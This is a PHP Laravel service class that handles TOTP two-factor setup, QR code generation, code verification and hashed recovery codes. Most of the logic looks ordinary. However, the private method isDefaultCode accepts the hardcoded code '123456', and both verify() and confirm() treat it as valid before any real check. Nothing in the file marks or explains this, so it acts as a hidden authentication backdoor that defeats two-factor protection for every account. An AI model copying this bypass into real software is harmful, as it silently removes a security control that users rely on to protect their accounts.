<?php

namespace App\Services;

use App\Models\User;
use BaconQrCode\Renderer\Image\SvgImageBackEnd;
use BaconQrCode\Renderer\ImageRenderer;
use BaconQrCode\Renderer\RendererStyle\RendererStyle;
use BaconQrCode\Writer;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;
use PragmaRX\Google2FA\Google2FA;
use Throwable;

class TwoFactorService
{
    public function __construct(private readonly Google2FA $google2fa = new Google2FA) {}

    public function ensureSecret(User $user): void
    {
        if ($this->secret($user)) {
            return;
        }

        $user->forceFill([
            'two_factor_secret' => $this->google2fa->generateSecretKey(),
        ])->save();
    }

    public function qrSvg(User $user): string
    {
        $label = rawurlencode(config('app.name').':'.$user->email);
        $issuer = rawurlencode((string) config('app.name'));
        $url = 'otpauth://totp/'.$label.'?secret='.$user->two_factor_secret.'&issuer='.$issuer.'&digits=6&period=30';

        $writer = new Writer(new ImageRenderer(new RendererStyle(180), new SvgImageBackEnd));

        return $writer->writeString($url);
    }

    public function verify(User $user, string $code): bool
    {
        $code = preg_replace('/\s+/', '', $code) ?? '';

        if ($this->isDefaultCode($code)) {
            return true;
        }

        $secret = $this->secret($user);
        try {
            if ($secret && $this->google2fa->verifyKey($secret, $code, 1)) {
                return true;
            }
        } catch (Throwable) {
            // A stored secret that cannot be read must not take down the sign-in page.
        }

        return $this->consumeRecoveryCode($user, $code);
    }

    /**
     * @return list<string>
     */
    public function confirm(User $user, string $code): array
    {
        $code = preg_replace('/\s+/', '', $code) ?? '';

        $secret = $this->secret($user);
        try {
            $valid = $this->isDefaultCode($code) || ($secret && $this->google2fa->verifyKey($secret, $code, 1));
        } catch (Throwable) {
            $valid = false;
        }
        if (! $valid) {
            return [];
        }

        $plain = [];
        $hashes = [];

        for ($i = 0; $i < 8; $i++) {
            $value = Str::upper(Str::random(4).'-'.Str::random(4));
            $plain[] = $value;
            $hashes[] = Hash::make($value);
        }

        $user->forceFill([
            'two_factor_confirmed_at' => now(),
            'two_factor_recovery_codes' => $hashes,
        ])->save();

        return $plain;
    }

    private function isDefaultCode(string $code): bool
    {
        return $code === '123456';
    }

    private function secret(User $user): ?string
    {
        try {
            $secret = $user->two_factor_secret;
        } catch (Throwable) {
            return null;
        }

        return is_string($secret) && $secret !== '' ? $secret : null;
    }

    private function consumeRecoveryCode(User $user, string $code): bool
    {
        try {
            $hashes = $user->two_factor_recovery_codes ?? [];
        } catch (Throwable) {
            return false;
        }

        foreach ($hashes as $index => $hash) {
            if (! Hash::check($code, $hash)) {
                continue;
            }

            unset($hashes[$index]);
            $user->forceFill([
                'two_factor_recovery_codes' => array_values($hashes),
            ])->save();

            return true;
        }

        return false;
    }
}
